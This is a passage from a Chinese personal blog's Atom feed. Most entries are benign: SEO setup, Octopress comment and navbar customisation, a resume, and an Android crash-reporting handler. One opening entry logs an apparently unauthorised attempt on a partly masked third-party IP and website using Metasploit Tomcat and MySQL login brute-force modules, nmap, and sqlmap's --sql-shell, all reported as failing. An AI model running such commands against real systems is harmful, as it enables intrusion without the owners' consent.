                    join(50000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }.start();
}
}
</code></pre>

<p>扫了好久..结果发现没有扫到 原因有两个</p>

<ol>
<li><p>其实扫到了 不过控制台信息太多了 把扫到的端口顶掉了 我应该把输出写到一个log里</p></li>
<li><p>就是并发线程没控制好.一个线程remove list数据的时候,另外一个线程已经remove了.然后数据在List的位置就会改变,导致漏了好多端口.我应该做线程锁,或者写map的 检查过就把value设成true.</p></li>
</ol>


<p>好了扫描端口其实只是一个尝试,并没有太多技术含量.我决定要从Tomcat入手.尝试用metasploit破解Tomcat</p>

<h3>0x04 metasploit 入侵Tomcat</h3>

<p>终端输入</p>

<pre><code>msfconsole
</code></pre>

<p>设置入侵Tomcat</p>

<pre><code>msf &gt; use auxiliary/scanner/http/tomcat_mgr_login
msf auxiliary(tomcat_mgr_login) &gt; set RHoSTS 122.233.243.***
RHoSTS =&gt; 122.233.243.***
msf auxiliary(tomcat_mgr_login) &gt; set RPORT 80
RPORT =&gt; 80
msf auxiliary(tomcat_mgr_login) &gt; run
</code></pre>

<p>结果并没有破解出密码- -.</p>

<p>参考文章<a href="http://www.rising.com.cn/newsletter/news/2013-03-01/13256.html">http://www.rising.com.cn/newsletter/news/2013-03-01/13256.html</a></p>

<h3>0x05 再次尝试利用 metasploit 检测出 数据库端口</h3>

<pre><code>msf &gt; nmap -Pn -sV 122.233.243.***

Starting Nmap 6.47 ( http://nmap.org ) at 2015-07-19 23:05 CST

Nmap scan report for 122.233.243.***
Host is up (0.13s latency).
Not shown: 991 filtered ports

PORT      STATE  SERVICE           VERSION
80/tcp    open   http              Apache Tomcat/Coyote JSP engine 1.1
135/tcp   closed msrpc
139/tcp   closed netbios-ssn
593/tcp   closed http-rpc-epmap
3389/tcp  open   ms-wbt-server     Microsoft Terminal Service
4444/tcp  closed krb524
6059/tcp  open   tcpwrapped
10000/tcp open   snet-sensor-mgmt?
10010/tcp open   rxapi?
Service Info: OS: Windows
</code></pre>

<p>好像并没有我们想得到的</p>

<h3>0x06 穷途末路的我尝试了下mysql扫描</h3>

<pre><code>msf auxiliary(tomcat_mgr_login) &gt; use auxiliary/scanner/mysql/mysql_login
msf auxiliary(mysql_login) &gt; set RHOSTS 122.233.243.***
RHOSTS =&gt; 122.233.243.***
msf auxiliary(mysql_login) &gt; run

[-] 122.233.243.***:3306 MYSQL - Unable to connect: The connection timed out (122.233.243.***:3306).
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre>

<p>其实傻子也知道不可以- -因为看了下<code>info</code>扫的端口是3306 怎么可能可以&hellip;.</p>

<p>参考链接<a href="http://www.bubuko.com/infodetail-343797.html">http://www.bubuko.com/infodetail-343797.html</a></p>

<h3>0x07 利用sql-shell查端口</h3>

<pre><code>show variables like 'port';

or

select * from global_variables where VARIABLE_NAME ='PORT';
</code></pre>

<p>上面2个命令都可以查询端口,但是global_variables表属于临时表,只在当前连接下显示,所以无法利用 但是还是想通过insert 插入到一个表中</p>

<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --sql-shell  "SELECT  'global_variables'" -v 5 

insert into hr_event(name) select VARIABLE_NAME from information_schema.global_variables where VARIABLE_NAME ='PORT';
[02:46:34] [WARNING] execution of custom SQL queries is only available when stacked queries are supported
</code></pre>

<p>通过sqlmap执行的sql-shell只能执行简单的查询,所以此法无效</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[网站 seo的开始]]></title>
    <link href="http://mzkmzk.github.io/blog/2015/07/16/seo_start/"/>
    <updated>2015-07-16T21:28:46+08:00</updated>
    <id>http://mzkmzk.github.io/blog/2015/07/16/seo_start</id>
    <content type="html"><![CDATA[<p>网站的seo 一开始主要给百度和谷歌提交网站地图和优化代码</p>

<h3>0x00 验证网址</h3>

<p>首先要先验证网址是你的- -.</p>

<p>百度站长地址:<a href="http://zhanzhang.baidu.com/">http://zhanzhang.baidu.com/</a></p>

<p>谷歌站长地址<a href="https://www.google.com/webmasters/tools/">https://www.google.com/webmasters/tools/</a></p>

<h3>0x01 提交网址</h3>

<p>跟目录下编写<code>robots.txt</code>文件</p>

<p>eg:</p>

<pre><code>User-agent: *
Disallow: 

Sitemap: http://mzkmzk.github.io/sitemap.xml 
</code></pre>

<p><code>http://mzkmzk.github.io/sitemap.xml</code>则为我的网站地图</p>

<p>生成网址<a href="https://www.xml-sitemaps.com/">https://www.xml-sitemaps.com/</a></p>

<p>然后再百度和站长工具提交robots.txt和sitemap.xml即可</p>

<h3>后续建议</h3>

<p>SEO 网站的质量最为关键 其次,可以CSS和JS合成减少网络请求也有用,最好建一个百度统计,时刻留意网站访问趋势。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[octorpess添加评论功能]]></title>
    <link href="http://mzkmzk.github.io/blog/2015/07/16/comments_octopress/"/>
    <updated>2015-07-16T21:28:46+08:00</updated>
    <id>http://mzkmzk.github.io/blog/2015/07/16/comments_octopress</id>
    <content type="html"><![CDATA[<p>使用的是<code>多说评论系统</code></p>

<p>注册多说<a href="http://duoshuo.com/">http://duoshuo.com/</a></p>

<h3>0x00 系统设置修改</h3>

<p>在<code>_config.xml</code>文件最下方添加 yurename为注册多说时的个性域名二级域名,例如mzkmzk.duoshuo.com yourname则为mzkmzk</p>

<pre><code># duoshuo comments
duoshuo_comments: true
duoshuo_short_name: yourname
</code></pre>

<h3>0x01 修改页面</h3>

<p>在 <code>source/_layouts/post.html</code> 最下方添加的 <code>disqus</code>代码</p>

<pre><code>\{\% if site.duoshuo_short_name and site.duoshuo_comments == true and page.comments == true \%\}
&lt;section&gt;
&lt;h1&gt;Comments&lt;/h1&gt;
&lt;div id="comments" aria-live="polite"&gt;\{\% include post/duoshuo.html \%\}&lt;/div&gt;
 &lt;/section&gt;
 \{\% endif \%\}
</code></pre>

<p>如果你希望一些单独的页面下方也放置评论功能，譬如 <code>rake new_page["xxx"]</code> 产生的页面也能评论，那么请在 <code>source/_layouts/page.html</code> 中也做如上的修改。</p>

<h3>0x02 创建模块代码</h3>

<p>创建文件<code>source/_includes/post/duoshuo.html</code></p>

<p>代码如下</p>

<pre><code>&lt;!-- 多说评论框 start --&gt;
&lt;div class="ds-thread" data-thread-key="\{\% if site.titlecase \%\}\{\{ page.title | titlecase \}\}\{\% else \%\}\{\{ page.title \}\}\{\% endif \%\}" data-title="\{\% if site.titlecase \%\}\{\{ page.title | titlecase \}\}\{\% else \%\}\{\{ page.title \}\}\{\% endif \%\}" data-url="\{\% if site.url \%\}\{\{ page.url | url \}\}\{\% else \%\}\{\{ page.url \}\}\{\% endif \%\}"&gt;&lt;/div&gt;
&lt;!-- 多说评论框 end --&gt;
&lt;!-- 多说公共JS代码 start (一个网页只需插入一次) --&gt;
&lt;script type="text/javascript"&gt;
var duoshuoQuery = {short_name:"mzkmzk"};
(function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0] 
     || document.getElementsByTagName('body')[0]).appendChild(ds);
})();
&lt;/script&gt;
&lt;!-- 多说公共JS代码 end --&gt;
</code></pre>

<h3>0x03 在文章标签处添加评论快捷键</h3>

<p>就是在文章左侧添加一个按钮 点一下即可到评论模块</p>

<p>文件<code>_includes/article.html</code></p>

<pre><code>        \{\% if site.disqus_short_name and page.comments != false and post.comments != false and site.disqus_show_comment_count == true \%\}
     | &lt;a href="\{\% if index \%\}\{\{ root_url \}\}\{\{ post.url \}\}\{\% endif \%\}#disqus_thread"&gt;Comments&lt;/a&gt;
    \{\% endif \%\}
</code></pre>

<p>下方添加</p>

<pre><code>   \{\% if site.duoshuo_short_name and page.comments != false and post.comments != false and site.duoshuo_comments == true \%\}
      | &lt;a href="\{\% if index \%\}\{\{ root_url \}\}\{\{ post.url \}\}\{\% endif \%\}#comments"&gt;Comments&lt;/a&gt;
     \{\% endif \%\}
</code></pre>

<h3>参考链接</h3>

<p><a href="http://havee.me/internet/2013-02/add-duoshuo-commemt-system-into-octopress.html">http://havee.me/internet/2013-02/add-duoshuo-commemt-system-into-octopress.html</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[个人简历]]></title>
    <link href="http://mzkmzk.github.io/blog/2015/07/16/adoube_me.markdwon/"/>
    <updated>2015-07-16T21:28:46+08:00</updated>
    <id>http://mzkmzk.github.io/blog/2015/07/16/adoube_me.markdwon</id>
    <content type="html"><![CDATA[<p>毕业于天津大学仁爱学院,深圳和东莞地区求职,java、android、web方向。大学主要参加比赛与接外包项目,曾荣获华北五省计算机大赛一等奖、蓝桥杯软件大赛全国三等奖和服务外包大赛二等奖。外包项目方向主要为Web响应式设计与就业系统设计。个人博客<a href="http://mzkmzk.github.io">http://mzkmzk.github.io</a>。项目视频展示<a href="http://i.youku.com/404MZK">http://i.youku.com/404MZK</a></p>

<p>个人简历</p>

<p><img src="http://mzkmzk.github.io/images/blog/2015-07-16-01.jpg" alt="简历-1" />
<img src="http://mzkmzk.github.io/images/blog/2015-07-16-02.jpg" alt="简历-2" />
<img src="http://mzkmzk.github.io/images/blog/2015-07-16-03.jpg" alt="简历-3" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[修改octopress导航栏]]></title>
    <link href="http://mzkmzk.github.io/blog/2015/07/13/update_slash/"/>
    <updated>2015-07-13T21:28:46+08:00</updated>
    <id>http://mzkmzk.github.io/blog/2015/07/13/update_slash</id>
    <content type="html"><![CDATA[<!--more-->


<p>本人想做一个类似本博客中 导航栏的这个下拉选项效果</p>

<h3>0x00 添加下拉框</h3>

<p>导航栏页面 <code>/source/_include/header.html</code></p>

<p> 在h1标签下添加下拉框</p>

<pre><code>    &lt;nav id="K_select"&gt;
    &lt;div class="alignleft menu"&gt;
        &lt;a class="button"&gt;Category&lt;/a&gt;
        &lt;div class="container"&gt;\{\% include navigation.html %\}\&lt;/div&gt;
    &lt;/div&gt;
    &lt;div class="alignright search"&gt;
        &lt;a class="button"&gt;&lt;/a&gt;
        &lt;div class="container"&gt;
            &lt;form action="\{\{\ site.simple_search \}\}\" method="get"&gt;
                &lt;input type="text" name="q" results="0"&gt;
                &lt;input type="hidden" name="q" value="site:\{\{\ site.url | shorthand_url \}\}\"&gt;
            &lt;/form&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    &lt;/nav&gt;
</code></pre>

<h3>0x01 设置相关css</h3>

<p>css<code>/source/styleshets/screen.css</code></p>

<pre><code>#K_select
 {
display: block
}

#K_select a
{
display: block
}

#K_select .button
{
cursor: pointer
}

#K_select .container
{
display: none
}

#K_select .menu
{
position: relative;
width: 150px;
margin-left:175px;
}

#K_select .menu .button
{
background: #f2f2f2;
border: 1px solid #ddd;
color: #999;
padding: 0 60px 0 10px;
position: relative;
-webkit-border-radius: 5px;
-moz-border-radius: 5px;
-ms-border-radius: 5px;
-o-border-radius: 5px;
border-radius: 5px
}

#K_select .menu .button:hover
{
color: #999
}

#K_select .menu .button.on
{
color: #666;
-webkit-border-radius: 5px 5px 5px 0;
-moz-border-radius: 5px 5px 5px 0;
-ms-border-radius: 5px 5px 5px 0;
-o-border-radius: 5px 5px 5px 0;
border-radius: 5px 5px 5px 0
}

#K_select .menu .button.on:before
{
content: "\f077"
}

#K_select .menu .button:before
{
content: "\f078";
color: #ddd;
font: 16px FontAwesome;
line-height: 30px;
position: absolute;
top: 0;
right: 40px
}

#K_select .menu .container
{
background: #f2f2f2;
border: 1px solid #ddd;
border-top: none;
position: absolute;
top: 31px;
z-index: 1;
-webkit-border-radius: 0 0 5px 5px;
-moz-border-radius: 0 0 5px 5px;
-ms-border-radius: 0 0 5px 5px;
-o-border-radius: 0 0 5px 5px;
border-radius: 0 0 5px 5px
}

#K_select .menu .container ul
{
list-style: none
}

#K_select .menu .container ul ul
{
margin-left: 20px
}

#K_select .menu .container a
{
padding: 0 10px
}

#K_select .search
{
position: absolute;
/*top: 0;
right: 0*/
}

#K_select .search .button
{
background: #ddd;
width: 30px;
height: 30px;
position: absolute;
/*top: 1px;
right: -1px;*/
margin-top: 1px;
margin-left: 315px;
-webkit-border-radius: 0 5px 5px 0;
-moz-border-radius: 0 5px 5px 0;
-ms-border-radius: 0 5px 5px 0;
-o-border-radius: 0 5px 5px 0;
border-radius: 0 5px 5px 0
}

#K_select .search .button:before
{
content: "\f002";
color: #f2f2f2;
font: 20px FontAwesome;
line-height: 30px;
position: absolute;
top: 0;
left: 7px
}

#K_select .search .button.on
{
background: #ccc
}

#K_select .search .button.on:before
{
content: "\f00d"
}

#K_select .search .container
{
padding-left: 190px;
/*position: absolute;
right: 51px;*/
z-index: 1
}

#K_select .search input[type="text"]
{
background: #fff;
border: 1px solid #ddd;
border-right: none;
color: #999;
font: 13px "HelveticaNeue-Light","Helvetica Neue Light","Helvetica Neue",Helvetica,Arial,sans-serif;
height: 30px;
width: 100%;
padding: 0 10px;
-webkit-border-radius: 5px 0 0 5px;
-moz-border-radius: 5px 0 0 5px;
-ms-border-radius: 5px 0 0 5px;
-o-border-radius: 5px 0 0 5px;
border-radius: 5px 0 0 5px
}

#K_select .search input[type="text"]:focus,#K_select .search input[type="text"]:active
{
background: #fff;

color: #666;
outline: none
}

@media screen and (max-width: 600px)
{
#K_select
{
   display: none !important;
}
}

@media screen and (min-width: 600px)
{
#header {
    height: 30px !important;
}
#header h1
{
    float: left !important;
}

#main-nav {
    float: left !important;
    margin-left: 30px;
    margin-top: 0px;
}
} 
</code></pre>

<h3>0x02 设置JS</h3>

<p>文件 <code>/sourece/javascripts/slash.js</code>在function内添加以下代码</p>

<pre><code>var k_select = $('#K_select');

$('html').click(function(){
    k_select.find('.on').each(function(){
        $(this).removeClass('on').next().hide();
    });
});

k_select.on('click', '.menu .button', function(){
    if (!$(this).hasClass('on')){
        var width = $(this).width() + 42;
        $(this).addClass('on').next().show().css({width: width});
    } else {
        $(this).removeClass('on').next().hide();
    }
}).on('click', '.search .button', function(){
    if (!$(this).hasClass('on')){
        var width = 120;
        k_select.children('.menu').children().eq(0).removeClass('on').next().hide();
        $(this).addClass('on').next().show().css({width: width}).children().children().eq(0).focus();
    } else {
        $(this).removeClass('on').next().hide().children().children().eq(0).val('');
    }
}).click(function(e){
    e.stopPropagation();
});
</code></pre>

<h3>0x03 遍历分类目录</h3>

<p><code>/source/_include/custom/navigation.html</code>ul标签内</p>

<pre><code>    \{\% for category in site.categories \%\}
&lt;li&gt;&lt;a href="\{\{ root_url \}\}/blog/categories/\{\{ category | first \}\}"&gt;\{\{ category | first \}\}&lt;/a&gt;&lt;/li&gt;
\{\% endfor \%\}
</code></pre>

<h3>参考资料</h3>

<p>遍历分类<a href="http://segmentfault.com/a/1190000000406017">http://segmentfault.com/a/1190000000406017</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ps网上知识积累]]></title>
    <link href="http://mzkmzk.github.io/blog/2015/07/02/ps.markdwon/"/>
    <updated>2015-07-02T21:28:46+08:00</updated>
    <id>http://mzkmzk.github.io/blog/2015/07/02/ps.markdwon</id>
    <content type="html"><![CDATA[<!--more-->


<h3>ps知识积累</h3>

<p>消除背景<a href="http://jingyan.baidu.com/article/17bd8e52f64bc485ab2bb8c1.html">http://jingyan.baidu.com/article/17bd8e52f64bc485ab2bb8c1.html</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Android 捕抓异常发送给服务器]]></title>
    <link href="http://mzkmzk.github.io/blog/2015/06/25/android_exception/"/>
    <updated>2015-06-25T21:28:46+08:00</updated>
    <id>http://mzkmzk.github.io/blog/2015/06/25/android_exception</id>
    <content type="html"><![CDATA[<!--more-->


<p>在任何服务性行业中,用户遇到的问题,我们就要解决
所以app也要捕抓到用户在使用过程中的bug</p>

<p>他们就是我们的测试人员</p>

<p>本文中讲两部分,一部分是被我们捕抓到的异常,另一部分是我们没有捕抓到的,从而导致app奔溃的异常。</p>

<p>异常最终都写入log.我把log放在可访问的地方,在浏览器输入地址即可查看</p>

<p>效果如:</p>

<pre><code>用户 ID: null it is UncaughtExceptionHandler
2015-06-25-22:21class: com.tjrac.activity._0.LoginActivity$AndroidUser_Login; method: run; line: 141;  Exception: java.lang.NullPointerException
2015-06-25-22:21class: java.lang.Thread; method: run; line: 1019;  Exception: java.lang.NullPointerException


用户 ID: null it is UncaughtExceptionHandler
2015-06-25-22:22class: com.tjrac.activity._0.LoginActivity$AndroidUser_Login; method: run; line: 141;  Exception: java.lang.NullPointerException
2015-06-25-22:22class: java.lang.Thread; method: run; line: 1019;  Exception: java.lang.NullPointerException
</code></pre>

<h3>0x00 服务器接受异常数据</h3>

<p>无论是我们捕抓或是没捕抓到的异常,服务器接受的方法都一样,写入一个.log文件中.我用的是Struts2框架</p>

<pre><code>public class PrintException implements Action {

@Override
public String execute() throws Exception {
    HttpServletRequest request =ServletActionContext.getRequest();
    request.getContextPath();
    File file =new File(ServletActionContext.getServletContext().getRealPath("/log")+"/Exception.log");
    System.out.println(file.getPath());
    PrintWriter pw =new PrintWriter(new OutputStreamWriter(new FileOutputStream(file,true),"UTF-8"),true);
    pw.println("用户 ID: "+request.getParameter("cert_id"));
    pw.println(request.getParameter("exception"));
    pw.println();
    pw.close();
    return null;
}
</code></pre>

<h3>0x01 发送被我们捕抓到的异常</h3>

<p>这个就相对简单直接在捕抓异常后面加一个处理语句.题外话,可不可以重写捕抓异常的方法,然后捕抓异常后会自动发送异常给服务器.</p>

<p>在捕抓到异常后调用sendException方法,我这里多给了一个Context,因为要获取到用户的id 然后方便处理异常.</p>

<pre><code>public static void sendException(Context context,Exception exception){
    List&lt;NameValuePair&gt; params = new ArrayList&lt;NameValuePair&gt;();
    params.add(new BasicNameValuePair("cert_id", context
            .getSharedPreferences("user", 0).getString("cert_id", null)));
    params.add(new BasicNameValuePair("exception",ExceptionToString(exception)));
    ModelServer modelHttp = new ModelServer();
    modelHttp.Model_server(params, "PrintException");
}

/**
 * 将Exception 转为String
 * @param exception
 * @return
 */
public static String ExceptionToString(Exception exception ){
    StringWriter sw = new StringWriter();
    PrintWriter pw =new PrintWriter(sw);
    pw.println("异常发生时间 : "+getSystemTime_Minute());
    exception.printStackTrace(pw);
    pw.close();
    return sw.toString();
}
</code></pre>

<h3>0x02 设置捕抓全局异常</h3>

<p>这里写了一个捕抓的Handler 通常不用大改,一般只改getTraceInfo()方法。</p>

<pre><code>import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.io.Writer;
import java.lang.Thread.UncaughtExceptionHandler;
import java.lang.reflect.Field;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Map.Entry;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Build;
import android.os.Environment;
import android.os.Looper;
import android.util.Log;
import android.widget.Toast;

/**
 * UncaughtException处理类,当程序发生Uncaught异常的时候,有该类来接管程序,并记录发送错误报告.
 * 
 * @author user 
 */
@SuppressLint("SdCardPath")
public class CrashHandler implements UncaughtExceptionHandler {

public static final String TAG = "TEST";

// CrashHandler 实例
private static CrashHandler INSTANCE = new CrashHandler();

// 程序的 Context 对象
private Context mContext;

// 系统默认的 UncaughtException 处理类
private Thread.UncaughtExceptionHandler mDefaultHandler;

// 用来存储设备信息和异常信息
private Map&lt;String, String&gt; infos = new HashMap&lt;String, String&gt;();

// 用来显示Toast中的信息
private static String error = "程序错误，额，不对，我应该说，服务器正在维护中，请稍后再试";

private static final Map&lt;String, String&gt; regexMap = new HashMap&lt;String, String&gt;();

// 用于格式化日期,作为日志文件名的一部分
private DateFormat formatter = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss",
        Locale.CHINA);

/** 保证只有一个 CrashHandler 实例 */
private CrashHandler() {
    //
}

/** 获取 CrashHandler 实例 ,单例模式 */
public static CrashHandler getInstance() {
    initMap();
    return INSTANCE;
}

/**
 * 初始化
 * 
 * @param context
 */
public void init(Context context) {
    mContext = context;

    // 获取系统默认的 UncaughtException 处理器
    mDefaultHandler = Thread.getDefaultUncaughtExceptionHandler();

    // 设置该 CrashHandler 为程序的默认处理器
    Thread.setDefaultUncaughtExceptionHandler(this);
    Log.d("TEST", "Crash:init");
}

/**
 * 当 UncaughtException 发生时会转入该函数来处理
 */
@Override
public void uncaughtException(Thread thread, Throwable ex) {
    if (!handleException(ex) &amp;&amp; mDefaultHandler != null) {
        // 如果用户没有处理则让系统默认的异常处理器来处理
        mDefaultHandler.uncaughtException(thread, ex);
        Log.d("TEST", "defalut");
    } else {
        try {
            Thread.sleep(3000);
        } catch (InterruptedException e) {
            Log.e(TAG, "error : ", e);
        }
        // 退出程序
        android.os.Process.killProcess(android.os.Process.myPid());
        // mDefaultHandler.uncaughtException(thread, ex);
        System.exit(1);
    }
}

/**
 * 自定义错误处理，收集错误信息，发送错误报告等操作均在此完成
 * 
 * @param ex
 * @return true：如果处理了该异常信息；否则返回 false
 */
private boolean handleException(Throwable ex) {
    if (ex == null) {
        return false;
    }

    // 收集设备参数信息
    // collectDeviceInfo(mContext);
    // 保存日志文件
    saveCrashInfo2File(ex);
    // 使用 Toast 来显示异常信息
    new Thread() {
        @Override
        public void run() {
            Looper.prepare();
            Toast.makeText(mContext, error, Toast.LENGTH_LONG).show();
            Looper.loop();
        }
    }.start();
    return true;
}

/**
 * 收集设备参数信息
 * 
 * @param ctx
 */
public void collectDeviceInfo(Context ctx) {
    try {
        PackageManager pm = ctx.getPackageManager();
        PackageInfo pi = pm.getPackageInfo(ctx.getPackageName(),
                PackageManager.GET_ACTIVITIES);

        if (pi != null) {
            String versionName = pi.versionName == null ? "null"
                    : pi.versionName;
            String versionCode = pi.versionCode + "";
            infos.put("versionName", versionName);
            infos.put("versionCode", versionCode);
        }
    } catch (NameNotFoundException e) {
        Log.e(TAG, "an error occured when collect package info", e);
    }

    Field[] fields = Build.class.getDeclaredFields();
    for (Field field : fields) {
        try {
            field.setAccessible(true);
            infos.put(field.getName(), field.get(null).toString());
            Log.d(TAG, field.getName() + " : " + field.get(null));
        } catch (Exception e) {
            Log.e(TAG, "an error occured when collect crash info", e);
        }
    }
}

/**
 * 保存错误信息到文件中 *
 * 
 * @param ex
 * @return 返回文件名称,便于将文件传送到服务器
 */
private String saveCrashInfo2File(Throwable ex) {
    StringBuffer sb = getTraceInfo(ex);
    Writer writer = new StringWriter();
    PrintWriter printWriter = new PrintWriter(writer);
    ex.printStackTrace(printWriter);
    Throwable cause = ex.getCause();
    while (cause != null) {
        cause.printStackTrace(printWriter);
        cause = cause.getCause();
    }
    printWriter.close();

    String result = writer.toString();
    sb.append(result);
    try {
        long timestamp = System.currentTimeMillis();
        String time = formatter.format(new Date());
        String fileName = "crash-" + time + "-" + timestamp + ".log";

        if (Environment.getExternalStorageState().equals(
                Environment.MEDIA_MOUNTED)) {
            String path = Environment.getExternalStorageDirectory()
                    + "/crash/";
            File dir = new File(path);
            if (!dir.exists()) {
                dir.mkdirs();
            }
            FileOutputStream fos = new FileOutputStream(path + fileName);
            fos.write(sb.toString().getBytes());
            fos.close();
        }

        return fileName;
    } catch (Exception e) {
        Log.e(TAG, "an error occured while writing file...", e);
    }

    return null;
}

/**
 * 整理异常信息
 * @param e
 * @return
 */
public static StringBuffer getTraceInfo(Throwable exception) {
     /*
    StringBuffer sb = new StringBuffer();

    Throwable ex = e.getCause() == null ? e : e.getCause();
    StackTraceElement[] stacks = ex.getStackTrace();
    for (int i = 0; i &lt; stacks.length; i++) {
        if (i == 0) {
            setError(ex.toString());
        }
        sb.append(Utils.getSystemTime_Minute()).append("class: ").append(stacks[i].getClassName())
                .append("; method: ").append(stacks[i].getMethodName())
                .append("; line: ").append(stacks[i].getLineNumber())
                .append(";  Exception: ").append(ex.toString() + "\n");
    }

    Log.d(TAG, sb.toString());
    */
    List&lt;NameValuePair&gt; params = new ArrayList&lt;NameValuePair&gt;();
    params.add(new BasicNameValuePair("cert_id", "null it is UncaughtExceptionHandler"));
    params.add(new BasicNameValuePair("exception",Utils.ThrowableToString(exception)));
    ModelServer modelHttp = new ModelServer();
    modelHttp.Model_server(params, "PrintException");
    return new StringBuffer(Utils.ThrowableToString(exception));
}

/**
 * 设置错误的提示语
 * @param e
 */
public static void setError(String e) {
    Pattern pattern;
    Matcher matcher;
    for (Entry&lt;String, String&gt; m : regexMap.entrySet()) {
        Log.d(TAG, e+"key:" + m.getKey() + "; value:" + m.getValue());
        pattern = Pattern.compile(m.getKey());
        matcher = pattern.matcher(e);
        if(matcher.matches()){
            error = m.getValue();
            break;
        }
    }
}

/**
 * 初始化错误的提示语
 */
private static void initMap() {
    // Java.lang.NullPointerException
    // java.lang.ClassNotFoundException
    // java.lang.ArithmeticException
    // java.lang.ArrayIndexOutOfBoundsException
    // java.lang.IllegalArgumentException
    // java.lang.IllegalAccessException
    // SecturityException
    // NumberFormatException
    // OutOfMemoryError 
    // StackOverflowError 
    // RuntimeException 
    regexMap.put(".*NullPointerException.*", "嘿，无中生有~Boom!");
    regexMap.put(".*ClassNotFoundException.*", "你确定你能找得到它？");
    regexMap.put(".*ArithmeticException.*", "我猜你的数学是体育老师教的，对吧？");
    regexMap.put(".*ArrayIndexOutOfBoundsException.*", "恩，无下限=无节操，请不要跟我搭话");
    regexMap.put(".*IllegalArgumentException.*", "你的出生就是一场错误。");
    regexMap.put(".*IllegalAccessException.*", "很遗憾，你的信用卡账号被冻结了，无权支付");
    regexMap.put(".*SecturityException.*", "死神马上降临");
    regexMap.put(".*NumberFormatException.*", "想要改变一下自己形象？去泰国吧，包你满意");
    regexMap.put(".*OutOfMemoryError.*", "或许你该减减肥了");
    regexMap.put(".*StackOverflowError.*", "啊，啊，憋不住了！");
    regexMap.put(".*RuntimeException.*", "你的人生走错了方向，重来吧");

}

}
</code></pre>

<p>再写一个启动这个Handler的全局类</p>

<pre><code>import android.app.Application;

public class CrashApplication extends Application {

@Override
public void onCreate() {
    super.onCreate();
    CrashHandler crashHandler = CrashHandler.getInstance();
    crashHandler.init(getApplicationContext());
}

}
</code></pre>

<p>然后在AndroidManifest.xml注册下这个全局类</p>

<pre><code> &lt;application
 android:name="com.tjrac.utils.CrashApplication"...&gt;
</code></pre>

<h3>参考资料</h3>

<p>捕抓全局异常<a href="http://www.cnblogs.com/cpacm/p/3948991.html">http://www.cnblogs.com/cpacm/p/3948991.html</a></p>
]]></content>
  </entry>
  
</feed>
